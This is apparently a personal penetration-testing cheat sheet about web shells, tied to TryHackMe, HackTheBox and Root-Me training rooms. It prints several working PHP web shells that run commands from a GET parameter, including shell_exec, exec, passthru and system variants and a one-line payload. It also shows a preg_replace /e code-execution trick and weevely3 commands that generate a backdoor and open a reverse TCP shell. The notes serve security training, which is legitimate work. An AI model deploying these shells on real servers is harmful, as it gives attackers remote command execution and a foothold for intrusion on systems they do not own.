# Web shell

[![introtoshells](../../../_badges/thmp/introtoshells.svg)](https://tryhackme.com/room/introtoshells)
[![fileuploadattacks](../../../_badges/htb/fileuploadattacks.svg)](https://academy.hackthebox.com/course/preview/file-upload-attacks)

<div class="row row-cols-lg-2"><div>

A web shell is a shell that is *usually* accessed from a browser. When possible, we want to use it as a foothold to move to reverse shell.

The language used in the web shell is determined by the language the target web server understand, such as PHP, JavaScript, or .NET. ‚ú®

‚ö†Ô∏è Password protect your webshells during assignments and/or randomize the parameter name <small>(e.g., don't use `cmd`)</small>.
</div><div>

For JavaScript, you need to find a way for the website to execute your web shell, as unlike PHP, it's not automatically done by visiting the web shell URL.

On Kali, you can find preinstalled web shells in: ([GitLab](https://gitlab.com/kalilinux/packages/webshells))

```shell!
$ ls /usr/share/webshells
```

Alternatively, you can use [SecLists webshells](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells).
</div></div>

<hr class="sep-both">

## PHP web shell

<div class="row row-cols-lg-2"><div>

PHP web shells are PHP files such as `webshell.php`. Once uploaded on the target, you can execute them by browsing them with a browser.

Most web shells below are using GET to take to command to run. For instance, `[...]/webshell.php?cmd=id` to run the `id` command.

Most commands below are complex to handle redirections, multi-line results, default command, etc. You can always get by using simple payloads like `<?=system($_GET[0]??true);?>` and using `?0=whoami`.

<br>

#### shell_exec

This is a compacted web shell with `shell_exec`  ([doc](https://www.php.net/manual/en/function.shell-exec.php)).

```php!
<?="<pre>".shell_exec(($_GET['cmd'] ?? "whoami")." 2>&1")."</pre>"; ?>
```

You may replace `?=` with `?php echo ` if not supported.

<br>

#### weevely3

This is a web shell using [weevely3](https://github.com/epinna/weevely3) (3.0k ‚≠ê).

```ps
# generate a webshell.php protected by "password"
$ weevely generate <password> webshell.php
# connect to the web shell
$ weevely URL/webshell.php <password>
# see help
# ex: create a reverse shell
$ :backdoor_reversetcp IP PORT
```

<br>

#### phpbash

You can use the semi-interactive [phpbash](https://github.com/Arrexel/phpbash) <small>(0.8k ‚≠ê, 2018 ü™¶)</small>.


</div><div>

#### preg_replace

[![php_preg_replace](../../../_badges/rootme/web_server/php_preg_replace.svg)](https://www.root-me.org/en/Challenges/Web-Server/PHP-preg_replace)

In PHP < 7.0.0, we could execute PHP code in `preg_replace` for each match found <small>(since PHP 5.5, there is a warning)</small>.

```php!
<?php
echo preg_replace('/a/e', 'system("whoami");', 'a');
```

<br>

#### exec

This is a web shell using `exec` ([doc](https://www.php.net/manual/en/function.exec.php))

```php!
<?php
$output = "";
exec(($_GET["cmd"] ?? "whoami")." 2>&1", $output);
echo "<pre>".implode('<br>', $output)."</pre>";
?>
```

#### passthru

This is a web shell using `passthru`  ([doc](https://www.php.net/manual/en/function.passthru.php))

```php!
echo "<pre>";
echo passthru(($_GET["cmd"] ?? "whoami")." 2>&1");
echo "</pre>";
```

#### system

This is a web shell using `system` ([doc](https://www.php.net/manual/en/function.system.php))

```php!
<?php
echo "<pre>";
echo system(($_GET["cmd"] ?? "whoami")." 2>&1");
echo "</pre>";
?>
```
</div></div>

<hr class="sep-both">

## üëª To-do üëª

Stuff that I found, but never read/used yet.

<div class="row row-cols-lg-2"><div>

* [wso-webshell](https://github.com/mIcHyAmRaNe/wso-webshell)
* [jspbrowser](https://github.com/tennc/webshell/tree/master/jsp/jspbrowser)
* [webwrap](https://github.com/mxrch/webwrap)
</div><div>
</div></div>